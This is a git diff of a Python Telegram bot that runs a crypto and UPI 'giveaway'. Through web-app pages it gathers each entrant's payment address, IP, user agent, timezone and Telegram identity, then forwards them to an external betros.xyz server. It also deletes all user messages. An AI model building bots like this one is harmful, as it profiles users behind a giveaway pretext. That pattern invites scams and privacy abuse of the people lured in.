@@ -1,115 +1,149 @@
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
-from telegram.ext.callbackcontext import CallbackContext
-from telegram import (ChatAction)
-from telegram import ParseMode, Update
-import requests
-import json
-import hashlib
-import math
-from pytz import timezone
-import pytz
-import time
-from datetime import datetime
-import datetime as dt
+import logging
 import os
+import json
+import requests
+from telegram import (Update, KeyboardButton,
+                      ReplyKeyboardMarkup, ReplyKeyboardRemove, WebAppInfo)
+from telegram.ext import (Application,
+                          MessageHandler, CommandHandler, ContextTypes, filters)
+#from dotenv import load_dotenv
 
-TOKEN = os.environ.get("TOKEN")
-
-LINK = "https://giveaway.betros.xyz/_tgReg.php"
-
-GIVEAWAY = "https://giveaway.betros.xyz/?param="
-
-EVENT = "https://giveaway.betros.xyz/event.json"
-
-tx = dt.datetime.now().timestamp()
-
-utc = pytz.utc
-fmt = '%Y-%m-%d %H:%M:%S %Z%z'
-
-utc_dt = utc.localize(datetime.utcfromtimestamp(tx))
-
-kol_tz = timezone('Asia/Kolkata')
-kol_dt = utc_dt.astimezone(kol_tz)
-
-kolT = math.floor(kol_dt.timestamp())
-
-def start(update: Update, context: CallbackContext):
-    keyboard = [
-        [InlineKeyboardButton("Unique Giveaway Link",
-                              callback_data='giveawayLink')],
-        [InlineKeyboardButton(
-            "About Me", callback_data='me')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    context.bot.send_chat_action(
-                    chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
-    context.bot.send_message(
-                    chat_id=update.effective_message.chat_id, text="Hello Sir, How may I help you.", parse_mode="HTML",reply_markup=reply_markup)
+#load_dotenv()
 
 
-def keyboard_callback(update: Update, context: CallbackContext):
-    query = update.callback_query
-    if query.data == "giveawayLink":
-        respE = requests.post(EVENT)
-        if respE.status_code == 200:
-            respEJ = json.loads(respE.text)
-            if kolT > respEJ["startTime"]:
-                query.answer('Giveaway link time over')
-                context.bot.send_chat_action(
-                    chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
-                context.bot.send_message(
-                    chat_id=update.effective_message.chat_id, text="Giveaway Link Period over.", parse_mode="HTML", disable_web_page_preview=True)
-            else:
-                uid = str(update.effective_chat.id)
-                fname = update.effective_chat.first_name
-                result = hashlib.sha1(uid.encode())
-                dt = {"uid": uid, "fname": fname, "hash": result.hexdigest()}
-                resp = requests.post(LINK, data=dt)
-                if resp.status_code == 200:
-                    resj = json.loads(resp.text)
-                    query.answer('Your unique giveaway link')
-                    if resj["status"] == True and resj["exist"]:
-                        msg = "Your unique link for giveaway: {}{}".format(
-                            GIVEAWAY, result.hexdigest())
-                        context.bot.send_chat_action(
-                            chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
-                        context.bot.send_message(
-                            chat_id=update.effective_message.chat_id, text=msg, parse_mode="HTML", disable_web_page_preview=True)
-                    else:
-                        msg = "Your unique link for giveaway: {}{}".format(
-                            GIVEAWAY, result.hexdigest())
-                        context.bot.send_chat_action(
-                            chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
-                        context.bot.send_message(
-                            chat_id=update.effective_message.chat_id, text=msg, parse_mode="HTML", disable_web_page_preview=True)
+# Enable logging
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
+TOKEN = str(os.getenv("TOKEN"))
+
+AUTH_KEY = str(os.getenv("API_KEY"))
+
+
+def sendData(_obj):
+    headers = {'LMAO': AUTH_KEY}
+    payload = json.dumps(_obj)
+    response = requests.post(
+        'https://betros.xyz/_0webapp/_handler.php', headers=headers, json=payload)
+
+    if response.status_code == 200:
+        data = json.loads(response.text)
+        return data
+    else:
+        return {'status': False, 'message': 'Unable to connect to the server.'}
+
+
+# Define a `/start` command handler.
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if context.args:
+        if context.args[0] == "crypto":
+            await update.message.delete()
+            await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
+            reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(
+                text="Join Giveaway!", web_app=WebAppInfo(url="https://betros.xyz/_0webapp/69.html")), resize_keyboard=True)
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
+        elif context.args[0] == "fiat":
+            await update.message.delete()
+            await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
+            reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(text="Join Giveaway!", web_app=WebAppInfo(
+                url="https://betros.xyz/_0webapp/upi.html")), resize_keyboard=True)
+            await context.bot.send_message(chat_id=update.effective_chat.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
         else:
-            query.answer('Something went wrong')
-            context.bot.send_chat_action(
-                chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
-            context.bot.send_message(
-                chat_id=update.effective_message.chat_id, text="Something went wrong.", parse_mode="HTML", disable_web_page_preview=True)
-
-    if query.data == "me":
-        query.answer('About You')
-        msg = "<b>About You</b>\nName: {}\nUID: {}".format(
-            update.effective_chat.first_name, update.effective_message.chat_id)
-        context.bot.send_chat_action(
-            chat_id=update.effective_message.chat_id, action=ChatAction.TYPING)
-        context.bot.send_message(
-            chat_id=update.effective_message.chat_id, text=msg, parse_mode="HTML", disable_web_page_preview=True)
+            await update.effective_message.delete()
+            msg = f"Hi {update.effective_message.from_user.first_name}, Welcome to {context.bot.first_name}. What would you like to do today?"
+            await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=msg)
+    else:
+        await update.effective_message.delete()
+        msg = f"Hi {update.effective_message.from_user.first_name}, Welcome to {context.bot.first_name}. What would you like to do today?"
+        await update.effective_message.reply_chat_action(action="typing")
+        await update.effective_message.reply_text(text=msg)
 
 
-def main():
-    updater = Updater(token=TOKEN, use_context=True)
-    dp = updater.dispatcher
-    dp.add_handler(CommandHandler('start', start))
-    dp.add_handler(CallbackQueryHandler(keyboard_callback))
-    updater.start_polling()
-    updater.idle()
+async def crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.delete()
+    await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
+    reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(
+        text="Join Giveaway!", web_app=WebAppInfo(url="https://betros.xyz/_0webapp/69.html")), resize_keyboard=True)
+    await context.bot.send_message(chat_id=update.effective_chat.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
 
 
-# start application with main function
-if __name__ == '__main__':
+async def upi(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.delete()
+    await context.bot.sendChatAction(chat_id=update.effective_chat.id, action="typing")
+    reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(text="Join Giveaway!", web_app=WebAppInfo(
+        url="https://betros.xyz/_0webapp/upi.html")), resize_keyboard=True)
+    await context.bot.send_message(chat_id=update.effective_chat.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
+    await context.bot.send_message(chat_id=update.callback_query.from_user.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
+
+
+async def web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    data = json.loads(update.effective_message.web_app_data.data)
+    data['uid'] = update.effective_message.from_user.id
+    data['name'] = update.effective_message.from_user.full_name
+    if data["crypto"] == True:
+        try:
+            _send = sendData(data)
+            if _send["status"] == True:
+                msg = f"Your crypto Name: {update.effective_message.from_user.full_name}\nUID: {update.effective_message.from_user.id}\nAddress: {data['nm']}\nUser agent: {data['ua']}\nIp: {data['ip']}\nLanguage: {data['ulang']}\nTimezone: {data['tz']}\nTimestamp: {data['timestamp']}\n"
+                # print(msg)
+                await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=True))
+            else:
+                await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
+
+        except:
+            await update.message.reply_html(text="We are unable to connect to the server.", reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
+    else:
+        try:
+            _send = sendData(data)
+            if _send["status"] == True:
+                msg = f"Your crypto Name: {update.effective_message.from_user.full_name}\nUID: {update.effective_message.from_user.id}\nAddress: {data['nm']}\nUser agent: {data['ua']}\nIp: {data['ip']}\nLanguage: {data['ulang']}\nTimezone: {data['tz']}\nTimestamp: {data['timestamp']}\n"
+                # print(msg)
+                await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=True))
+            else:
+                await update.message.reply_html(text=_send["message"], reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
+        except:
+            await update.message.reply_html(text="We are unable to connect to the server.", reply_markup=ReplyKeyboardRemove(remove_keyboard=False))
+
+
+async def deleter(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        if update.message.text or update.message.photo or update.message.document or update.message.animation or update.message.audio or update.message.dice or update.message.poll or update.message.video or update.message.voice is not None:
+            await context.bot.deleteMessage(chat_id=update.effective_message.chat_id, message_id=update.effective_message.id)
+    except:
+        return
+
+
+"""async def keyboard_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    if query.data == "openWebApp":
+        await query.answer()
+        reply_keyboard = ReplyKeyboardMarkup.from_button(KeyboardButton(
+            text="Join Giveaway!", web_app=WebAppInfo(url="https://betros.xyz/_0webapp/69.html")), resize_keyboard=True)
+        await context.bot.deleteMessage(
+            chat_id=update.callback_query.from_user.id, message_id=update.callback_query.message.id)
+        await context.bot.send_message(chat_id=update.callback_query.from_user.id, text="Press the button below to participate in giveaway.", reply_markup=reply_keyboard)
+"""
+
+
+def main() -> None:
+    """Start the bot."""
+    # Create the Application and pass it your bot's token.
+    application = Application.builder().token(TOKEN).build()
+
+    application.add_handler(CommandHandler("start", start))
+    #application.add_handler(CallbackQueryHandler(keyboard_callback, pattern="^openWebApp$"))
+    application.add_handler(MessageHandler(
+        filters.StatusUpdate.WEB_APP_DATA, web_app_data))
+    application.add_handler(CommandHandler("crypto", crypto))
+    application.add_handler(CommandHandler("fiat", upi))
+    application.add_handler(MessageHandler(filters.ALL, deleter))
+
+    # Run the bot until the user presses Ctrl-C
+    application.run_polling()
+
+
+if __name__ == "__main__":
     main()
